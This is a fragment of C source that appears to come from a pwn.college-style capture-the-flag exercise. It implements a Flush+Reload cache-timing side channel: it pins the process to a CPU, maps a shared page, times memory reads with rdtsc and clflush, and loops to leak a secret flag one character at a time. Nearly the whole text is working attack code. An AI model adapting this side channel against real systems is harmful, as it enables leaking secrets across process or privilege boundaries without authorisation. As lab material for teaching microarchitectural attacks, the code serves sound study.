#define FLAG_LEN 21
#define TIMING_THRESHOLD 230

void pin_cpu(int cpu) {
  cpu_set_t my_set;
  CPU_ZERO(&my_set);
  CPU_SET(cpu, &my_set);
  sched_setaffinity(0, sizeof(my_set), &my_set);
}

int make_shared_page(char **addr) {
  printf("Creating Shared memory\n");

  shm_unlink("/pwncollege");
  int shm_fd = shm_open("/pwncollege", O_CREAT | O_RDWR, S_IRWXU | S_IRWXU | S_IRWXO);
  ftruncate(shm_fd, SHM_SIZE);
  *addr = (char *) mmap((void *) mmap_addr, SHM_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, shm_fd, 0);
  assert(*addr == (char *) mmap_addr);
  return shm_fd;
}

uint64_t flush_reload(char *ptr) {
  uint64_t nope;
  uint64_t start, end;

  start = __rdtsc();
  _mm_lfence();
  nope = *(volatile uint64_t*) ptr;
  _mm_lfence();
  end = __rdtsc();
  _mm_mfence();
  _mm_clflush(ptr);
  return end - start;
}

void flush_cache() {
  for (int k = 0; k < 256; k++) {
    _mm_clflush((char *) (0x1338000 + k * PAGE_SIZE));
  }
}


// TODO: Currently unused
void perform_sidechannel_attack(int *index, sem_t *sem) {
  char *ptr_base = 0x1338000;
  char leaked[100];

  for (int i = 0; i < FLAG_LEN; i++) {
    leaked[i] = ' ';
  }

  int leaked_chars = 0;
  while (leaked_chars < FLAG_LEN) {
    *index = (*index + 1) % (FLAG_LEN + 1);
    if (leaked[*index] != ' ') {
      continue;
    }

    flush_cache();

    sem_post(sem);
    for (int i = 0; i < 256; i++) {
      int mixed_index = ((i * 167) + 13) & 255;
      char *deref_me = ptr_base + mixed_index * PAGE_SIZE;

        if(flush_reload(deref_me) < (uint64_t) TIMING_THRESHOLD) {
          if((mixed_index >= '.' && mixed_index <= '}') && leaked[*index] == ' ') {
            leaked[*index] = mixed_index;
            leaked_chars++;
          }
        }
    }
  }
}

void get_timing_data(int *index, sem_t *sem, uint64_t *timing_data) {
  char *ptr_base = 0x1338000;

  for (int i = 0; i < 256; i++) {
    int mixed_index = ((i * 167) + 13) & 255;
    char *deref_me = ptr_base + mixed_index * PAGE_SIZE;
    timing_data[mixed_index] = flush_reload(deref_me);
  }
}
